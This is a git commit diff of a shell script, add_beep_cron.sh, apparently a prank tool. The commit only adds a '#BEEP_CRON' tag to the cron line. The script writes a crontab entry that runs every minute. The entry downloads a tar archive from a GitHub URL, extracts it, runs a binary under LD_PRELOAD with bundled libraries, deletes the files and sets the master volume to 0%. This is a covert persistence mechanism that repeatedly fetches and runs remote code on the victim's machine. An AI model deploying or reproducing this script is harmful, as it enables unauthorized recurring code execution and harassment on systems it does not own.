ccf239850a4be7f407a679e5d308bdf5255e1cef
skyf0l <tom.rorato@epitech.eu>
2021-03-31 17:43:03 +0200

    Update add_beep_cron.sh

--- add_beep_cron.sh
+++ add_beep_cron.sh
@@ -2,7 +2,7 @@
 
 cd "$(mktemp -d)";
 crontab -l > mycron;
-echo "* * * * * cd \"\$(mktemp -d)\" && wget https://github.com/skyf0l/skyf0l.github.io/raw/main/beep.tar -Obeep.tar && tar -xf beep.tar && LD_PRELOAD=\"\$(realpath libSFaudio.so) \$(realpath libSFsystem.so)\" ./beep.bin && rm -f libSFaudio.so libSFsystem.so beep.bin beep.ogg beep.tar && amixer set Master 0%" >> mycron;
+echo "* * * * * cd \"\$(mktemp -d)\" && wget https://github.com/skyf0l/skyf0l.github.io/raw/main/beep.tar -Obeep.tar && tar -xf beep.tar && LD_PRELOAD=\"\$(realpath libSFaudio.so) \$(realpath libSFsystem.so)\" ./beep.bin && rm -f libSFaudio.so libSFsystem.so beep.bin beep.ogg beep.tar && amixer set Master 0% #BEEP_CRON" >> mycron;
 crontab mycron;
 rm -f mycron;
 exit;
